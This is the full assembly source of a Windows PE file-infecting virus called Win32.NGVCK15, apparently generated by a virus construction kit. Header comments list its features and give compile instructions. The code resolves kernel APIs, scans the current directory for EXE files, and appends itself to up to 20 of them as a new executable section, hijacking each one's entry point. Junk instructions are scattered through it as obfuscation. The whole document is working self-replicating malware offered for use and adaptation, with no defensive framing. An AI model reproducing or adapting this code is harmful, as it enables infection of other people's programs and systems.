              
;
;
; Win32.NGVCK15 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.NGVCK15
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 2/29/2016
;  Infection Mark         : NGVC
;  Infection Type         : adding a new section 
;  API Search             : Byte Comparison Type I
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 31
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m1 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 10d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 pop eax
 sub eax, offset Delta
                                        ; mov ebp, eax
 push eax
 pop ebp
 jmp KernelSearchStart


;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
                                        ; clear ebx
 mov ebx, -46326d
 add ebx, 46326d

 push ebx
 push ebx
 push 3h
 push ebx
                                        ; add ebx, 1
 add ebx, 1d
 push ebx
 mov eax, 80000000h or 40000000h
 push eax
 lea eax, [ebp+WFD_szFileName]
 xchg eax, ebx

 push ebx
 call dword ptr [ebp+XCreateFileA]

 cmp eax, -1
 je Closed

 mov dword ptr [ebp+FileHandle], 0
 add dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
 push dword ptr [ebp+WFD_nFileSizeLow]
 pop ebx
 push ebx

                                        ; clear ecx
 mov ecx, 34651d
 sub ecx, 34651d
 push ecx
 push ebx
 push ecx
                                        ; mov edx, 4
 mov edx, 0
 add edx, 4d
 push edx
 push ecx
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], 0
 xor dword ptr [ebp+MapHandle], eax
 pop ebx
 add eax, -1
 inc eax
 jz CloseFile
 push ebx
 push 0
 push 0
 push 2h
 neg edx                                ; Trash
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 not ecx                                ; Trash
 cmp eax, 0
 je UnMapFile
 push eax
 pop dword ptr [ebp+MapAddress]
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...


;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 mov [ebp+InfCounter], 20d
 lea ecx, [ebp+filemask]
 xchg ecx, edx

                                        ; Find File to infect
 call FindFirstFileProc
                                        ; add eax, 1
 inc eax
 cmp eax, 0
 je EndInfectCurDir

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 cmp [ebp+InfCounter], 0h
 jna EndInfectCurDir
 and edx, 67471608d                     ; Trash
                                        ; find more Files
 call FindNextFileProc
 test eax, eax
 jnz InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
                                        ; mov esi, -1
 push -1d
 pop esi
 and esi, dword ptr [ebp+FindHandle]
 push esi
 and edx, 58490768d                     ; Trash
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 pop esi
                                        ; mov ebx, 4
 mov ebx, 4d
 sub esp, ebx
                                        ; store old EIP and ImageBase
 push dword ptr [ebp+OldBase]
 pop ebx

 mov dword ptr [ebp+retBase], -1
 and dword ptr [ebp+retBase], ebx

                                        ; clear edi
 mov edi, 34542d
 sub edi, 34542d
 add edi, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], 0
 xor dword ptr [ebp+retEIP], edi


                                        ; round to pages
 shr esi, 16d
 rol esi, 16d
                                        ; add esi, 1
 inc esi
GetKernelLoop:
                                        ; clear eax
 mov eax, 38051d
 sub eax, 38051d
 sub esi, 1
 mov ax, word ptr [esi+03ch]
 cmp ax,0f800h
 je GetKernelLoop
 cmp esi, dword ptr [esi+eax+34h]
 jnz GetKernelLoop
 mov dword ptr [ebp+KernelMZ], -1
 and dword ptr [ebp+KernelMZ], esi
 mov edx, esi
 add edx, [esi+3Ch]
 mov [KernelPE+ebp], edx

 sar eax, 13d                           ; Trash
 lea edx, GetApis
 add edx, ebp

 push edx
ret


;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; check for minimum filesize
                                        ; clear eax
 push 0
 pop eax
 add eax, dword ptr [ebp+WFD_nFileSizeLow]
 cmp eax, 20000d
 jbe NoInfection
                                        ; get and remove file attributes
 mov ecx, offset WFD_szFileName
 add ecx, ebp

 push ecx
 call dword ptr [ebp+XGetFileAttributesA]
 mov dword ptr [ebp+Attributes], eax
                                        ; mov ecx, 128
 mov ecx, ( 128d - 39d )
 add ecx, 39d
 push ecx
 lea ecx, [ebp+WFD_szFileName]
 xchg ecx, eax


 push eax
 call dword ptr [ebp+XSetFileAttributesA]
 dec eax
 inc eax
 jz NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
 push dword ptr [ebp+MapAddress]
 pop esi
                                        ; check for ZM
 movzx edx, word ptr [esi]
 xor edx, 'ZM'
 jz Goodfile
                                        ; mov eax, 33710
 mov eax, ( 33710d - 15d )
 add eax, 15d
 cmp eax, 33710d
 je Notagoodfile

Goodfile:
 cmp word ptr [esi+3Ch], 0h
 je Notagoodfile
 push dword ptr [esi+3Ch]
 pop eax
                                        ; check if header lies inside the file
 cmp eax, dword ptr [ebp+WFD_nFileSizeLow]
 ja Notagoodfile
 add eax, esi
                                        ; check for PE Header
                                        ; check for EP
 cmp word ptr [eax], 'EP'
 je Goodfile2
                                        ; mov ebx, 10691
 mov ebx, ( 10691d + 27d )
 sub ebx, 27d
 cmp ebx, 10691d
 je Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [eax+4Ch], 'NGVC'
 jnz yNotagoodfile
 jmp Notagoodfile
yNotagoodfile:
                                        ; check for DLL
 mov bx, word ptr [eax+16h]
 and bx, 0F000h
 mov ecx, eax                           ; Trash
 cmp bx, 02000h
 je Notagoodfile
 call InfectEXE                         ; Infect the file
 jnc Notagoodfile
                                        ; restore the file attributes
 push dword ptr [ebp+Attributes]
 pop edx
 push edx
 mov edx, offset WFD_szFileName
 add edx, ebp

 push edx
 call dword ptr [ebp+XSetFileAttributesA]
 jmp NoInfection

Notagoodfile:
 call UnMapFile

NoInfection:
ret




;                  [ ///// * Data * \\\\\ ]

Data:
 OTableVA    dd 0h
 MapAddress  dd 0h
 OldEIP      dd 0h

newsection:                           ; Settings for the new section
 nsname           db '.NGVCKvx'
 nsvirtualsize    dd 0                ; Virtual Size
 nsRVA            dd 0                ; Relative Virtual Address
 nsphysicalsize   dd 0                ; Size of Raw Data
 nsphysicaloffset dd 0                ; Pointer to Size of Raw Data
 nsreserved       dd 0,0,0            ; reserved
 nsflags          db 40h,0,0,0c0h     ; Section is executable code and writeable

 InfCounter  dd 0h
 ATableVA    dd 0h
 counter     dw 0h
 AlignReg1   dd 0h
 Misc1       dd 0h
 TempAPI     dd 0h
 PEheader    dd 0h
 KernelMZ    dd 0h
 AlignReg2   dd 0h

 APIOffsets:
 XCloseHandle           dd 0h
 XCreateFileMappingA    dd 0h
 XUnmapViewOfFile       dd 0h
 XMapViewOfFile         dd 0h
 XSetFileAttributesA    dd 0h
 XGetFileAttributesA    dd 0h
 XCreateFileA           dd 0h
 XFindClose             dd 0h
 XFindFirstFileA        dd 0h
 XFindNextFileA         dd 0h

 sectionalign   dd 0h
 OldBase     dd 400000h
 Attributes  dd 0h
 NewEIP      dd 0h
 MapHandle   dd 0h
 filemask    db '*.EXe',0
 TempApisearch1 dd 0h
 FindHandle  dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 filealign   dd 0h
 NTableVA    dd 0h
 NewSize     dd 0h
 FileHandle  dd 0h
 Trash1      dd 0h
 db 'Win32.NGVCK15 - SnakeByte',0
 KernelPE    dd 0h

 APINames:
 db 'CloseHandle', 0
 db 'CreateFileMappingA', 0
 db 'UnmapViewOfFile', 0
 db 'MapViewOfFile', 0
 db 'SetFileAttributesA', 0
 db 'GetFileAttributesA', 0
 db 'CreateFileA', 0
 db 'FindClose', 0
 db 'FindFirstFileA', 0
 db 'FindNextFileA', 0





;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
                                        ; clear ecx
 mov ecx, -22511d
 add ecx, 22511d
 add ecx, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], 0
 xor dword ptr [ebp+retEIP], ecx

                                        ; mov esi, -1
 mov esi, -1d
 and esi, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], esi



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
 or ebp, ebp
 jz FirstGenHost
 mov eax,12345678h
 org $-4
 retBase dd 0h
 add eax,12345678h
 org $-4
 retEIP dd 0h
 push eax
ret



;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
                                        ; mov esi, -1
 mov esi, 0
 add esi, -1d
 and esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov edx, [esi+3Ch]
 add edx, esi
                                        ; get File Alignment
                                        ; add edx, 60
 add edx, 60d
 mov eax, [edx]
 sub edx, 60d
 mov dword ptr [ebp+filealign], -1
 and dword ptr [ebp+filealign], eax
 mov esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov edi, dword ptr [esi+3Ch]
 add edi, esi
                                        ; infection by adding a new section
                                        ; as described by Lord Julus
 mov dword ptr [ebp+PEheader], -1
 and dword ptr [ebp+PEheader], edi
                                        ; get old Entrypoint
 mov ebx, dword ptr [edi+28h]
 mov dword ptr [ebp+OldEIP], -1
 and dword ptr [ebp+OldEIP], ebx
 mov eax, dword ptr [edi+34h]
 mov dword ptr [ebp+OldBase], -1
 and dword ptr [ebp+OldBase], eax
 mov edx, [edi+38h]
 mov dword ptr [ebp+sectionalign], -1
 and dword ptr [ebp+sectionalign], edx
                                        ; Get last section
 mov ecx, [edi+74h]
 shl ecx, 3
                                        ; clear eax
 mov eax, 51116d
 sub eax, 51116d
 mov ax, word ptr [edi+6h]
 mov ebx, 28h
 pushad
 mov eax, eax
 mul ebx
 push eax
 pop dword ptr [ebp+Misc1]
 popad
                                        ; mov eax, -1
 mov eax, ( -1d + 37d )
 sub eax, 37d
 and eax, dword ptr [ebp+Misc1]
 add edi, 78h
 add edi, ecx
 add edi, eax
 lea ecx, [ebp+newsection]


 xchg ecx, edi
 push ecx
                                        ; Calculate the RVA of the new section
 mov edx, [ecx-5*8+8d]
 add edx, [ecx-5*8+12d]
 mov eax, dword ptr [ebp + offset sectionalign]
 mov dword ptr [ebp+AlignReg1], edx
 mov dword ptr [ebp+AlignReg2], -1
 and dword ptr [ebp+AlignReg2], eax
 add dword ptr [ebp+Trash1], ebx        ; Trash
 mov dword ptr [ebp+nsphysicalsize], 0
 xor dword ptr [ebp+nsphysicalsize], edx
 Call Align
                                        ; mov edx, -1
 mov edx, ( -1d - 14d )
 add edx, 14d
 and edx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp + offset nsRVA], edx
                                        ;  calculate the virtual size of the new section
 mov edx, dword ptr [ebp + offset sectionalign]
 mov dword ptr [ebp+AlignReg1], VirusSize
 mov dword ptr [ebp+AlignReg2], -1
 and dword ptr [ebp+AlignReg2], edx
 Call Align
                                        ; clear ebx
 and ebx, 0
 xor ebx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+nsvirtualsize], 0
 add dword ptr [ebp+nsvirtualsize], ebx
                                        ; calculate physical offset
 mov eax,[ecx-5*8+20d]
 add eax,[ecx-5*8+16d]
 mov ecx,dword ptr [ebp + offset filealign]
 mov dword ptr [ebp+AlignReg1], -1
 and dword ptr [ebp+AlignReg1], eax
 mov dword ptr [ebp+AlignReg2], ecx
 Call Align
 push dword ptr [ebp+AlignReg1]
 pop edx
 mov dword ptr [ebp+nsphysicaloffset], -1
 and dword ptr [ebp+nsphysicaloffset], edx
                                        ; calculate new size
 push dword ptr [ebp+filealign]
 pop ecx
 mov ebx, edx
 add ebx, VirusSize
 mov dword ptr [ebp+AlignReg2], ecx
 mov dword ptr [ebp+AlignReg1], ebx
 call Align
 mov ebx, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], 0
 add dword ptr [ebp+NewSize], ebx
 pushad
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], 0
 add dword ptr [ebp+WFD_nFileSizeLow], ebx
 call CreateMap
 jc NoEXE
 mov edi, offset newsection
 add edi, ebp

                                        ; mov edx, 64
 mov edx, ( 64d xor 24d )
 xor edx, 24d
 pop esi
WriteNewSectionLoop:
 mov ch, byte ptr [edi]
 mov byte ptr [esi], ch
 sub edx, 1
                                        ; add edi, 1
 add edi, 1d
                                        ; add esi, 1
 add esi, 1d
 cmp edx, 0
 jne WriteNewSectionLoop
                                        ; increase section numbers
 mov edx, dword ptr [ebp+PEheader]
 add word ptr [edx+06h], 1
                                        ; mov eax, -1
 mov eax, ( -1d + 2d )
 sub eax, 2d
 and eax, dword ptr [ebp+nsRVA]
 mov dword ptr [ebp+NewEIP], 0
 add dword ptr [ebp+NewEIP], eax
                                        ; set new EIP
 mov dword ptr  [edx+28h], eax
                                        ; set infection mark
 mov dword ptr [edx+4Ch], 'NGVC'
                                        ; mov ebx, -1
 push -1d
 pop ebx
 and ebx, dword ptr [ebp+nsphysicaloffset]
 push ebx
                                        ; Append Virus
 pop edi
 mov eax, VirusSize
 lea edx, [ebp+Virus]
 xchg edx, esi

 add edi, dword ptr [ebp+MapAddress]

AppendLoop:
 movsb
 dec eax
 jnz AppendLoop
                                        ; decrease Infection Counter
                                        ; clear edx
 mov edx, 28150d
 sub edx, 28150d
 xor edx, dword ptr [ebp+InfCounter]
 add edx, -1
 mov dword ptr [ebp+InfCounter], -1
 and dword ptr [ebp+InfCounter], edx
 clc
ret

NoEXE:
 pop eax
 stc
ret



;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; ecx Lenght of API-Name
                                        ; esi Points to API-Name ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad




 mov ebx, dword ptr [ebp+NTableVA]
 rcl eax, 8d                            ; Trash


SearchNextApi1:                         ; search for the API's
 push ebx
                                        ; clear edx
 sub edx, edx
 add edx, dword ptr [ebp+KernelMZ]
 add edx, dword ptr [ebx]
                                        ; mov ebx, edx
                                        ; clear ebx
 sub ebx, ebx
 add ebx, edx
                                        ; mov edi, edx
                                        ; clear edi
 and edi, 0
 add edi, edx
 mov dword ptr [ebp+TempApisearch1], 0
 add dword ptr [ebp+TempApisearch1], ecx
 push edi
 push esi
 cld

                                        ; edi Points to API-Name ( Kernel )
                                        ; esi Points to API-Name ( Virus )
                                        ; compare Names

ApiCompareLoop:
 mov ah, byte ptr [edi]
 cmp ah, byte ptr [esi]
 jne ApiNotFound
 sub ecx, 1
 dec ecx
 inc ecx
 jz FoundApi1
                                        ; add edi, 1
 add edi, 1d
                                        ; add esi, 1
 add esi, 1d
 jmp ApiCompareLoop

ApiNotFound:                            ; we did not find it :(
 pop esi
 pop edi
 pop ebx
                                        ; mov ecx, -1
 mov ecx, ( -1d xor 7d )
 xor ecx, 7d
 and ecx, dword ptr [ebp+TempApisearch1]
 mov eax, edx                           ; Trash
                                        ; add ebx, 4
 dec ebx
 add ebx, 5d
 add word ptr [ebp+counter], 1h
 cmp word ptr [ebp+counter], 2000h
 je NotFoundApi1
 jmp SearchNextApi1
 adc eax, edx                           ; Trash

FoundApi1:                              ; we found the API
                                        ; clear Stack
 add esp, 12d
                                        ; retrieve the offset
 movzx edx, word ptr [ebp+counter]
                                        ; point to ordinal Table
 clc 
 rcl edx, 1                             ; multiply with 2
 add edx, dword ptr [ebp+OTableVA]
 push edx
 pop edi
                                        ; clear edx
 mov edx, 32716d
 sub edx, 32716d
 mov dx, word ptr [edi]
 shl edx, 2h
 add edx, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 mov ebx, dword ptr [edx]
 add ebx, dword ptr [ebp+KernelMZ]
 mov dword ptr [ebp+TempAPI], ebx
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop edx
 popad
 jmp ExecuteHost



;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
 mov eax, dword ptr [ebp+AlignReg1]
 mov ecx, dword ptr [ebp+AlignReg2]
                                        ; clear edx
 push 0
 pop edx
 push eax
 div ecx
 sub ecx, edx
 pop eax
 add eax, ecx
 mov dword ptr [ebp+AlignReg1], 0h
 add dword ptr [ebp+AlignReg1], eax
 popad
ret


;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need

                                        ; clear ebx
 xor ebx, ebx
 add ebx, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
                                        ; clear ecx
 xor ecx, ecx
 add ecx, [ebx+78h]
 add ecx, [ebp+KernelMZ]
                                        ; add ecx, 28
 add ecx, 28d
                                        ; get ATableVA
 mov ebx, dword ptr [ecx]
                                        ; add ecx, 4
 add ecx, 4d
 add ebx, [ebp+KernelMZ]
 mov dword ptr [ebp+ATableVA], ebx
                                        ; get NTableVA
 mov ebx, dword ptr [ecx]
                                        ; add ecx, 4
 dec ecx
 add ecx, 5d
 add ebx, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], ebx
                                        ; get OTableVA
 mov ebx, dword ptr [ecx]
 add ebx, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], ebx
                                        ; number of API's we're looking for
 mov ebx, NumberOfApis

                                        ; load API Names and Offsets
 lea eax, [ebp+APIOffsets]
 xchg edx, eax

 mov esi, offset APINames
 add esi, ebp
 or ecx, ecx                            ; Trash


GetApisLoop: 
                                        ; clear the counter
 mov word ptr [ebp+counter], 0h

 mov ecx, esi
APINameDetect:                          ; calculate the lenght of the names
 add ecx, 1d
 cmp byte ptr [ecx], 0
 jne APINameDetect

 push ecx
 sub dword ptr [esp], esi
 pop ecx
                                        ; search 'em
                                        ; ecx contains Name-Lenght
                                        ; esi points to the Name
                                        ; edx points to the offset

 call SearchAPI1
 add esi, ecx
                                        ; add esi, 1
 inc esi
                                        ; mov edi, -1
 mov edi, ( -1d xor 31d )
 xor edi, 31d
 and edi, dword ptr [ebp+TempAPI]
 mov dword ptr [edx], 0
 add dword ptr [edx], edi
                                        ; add edx, 4
 inc edx
 add edx, 3d
 sub ebx, 1
 jnz GetApisLoop
 shl eax, 1d                            ; Trash
 mov edi, ebp
 add edi, offset Outbreak

 push edi
ret



;          [ ///// * FindFiles Procedure * \\\\\ ]

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 lea edi, [ebp+WIN32_FIND_DATA]
 sbb ecx, 13d                           ; Trash
 xchg eax, edi

 push eax
 push edx
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], -1
 and dword ptr [ebp+FindHandle], eax
ret


ClearOldData:                           ; we don't want waste in the fields
 pushad
 mov ebx, ebp
 add ebx, offset WFD_szFileName

                                        ; mov eax, 276
 push 276d
 pop eax

ClearOldData2:
 mov byte ptr [ebx], 0h
                                        ; add ebx, 1
 sub ebx, -1d
 dec eax
 jnz ClearOldData2
 popad
ret


FindNextFileProc:                       ; find another file
 call ClearOldData
 lea esi, [ebp+WIN32_FIND_DATA]
 xchg esi, ebx

 push ebx
                                        ; clear ebx
 mov ebx, 0
 add ebx, dword ptr [ebp+FindHandle]
 push ebx
 call dword ptr [ebp+XFindNextFileA]
ret





CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
                                        ; clear eax
 mov eax, 0
 push eax
 call ExitProcess



end FakeCode

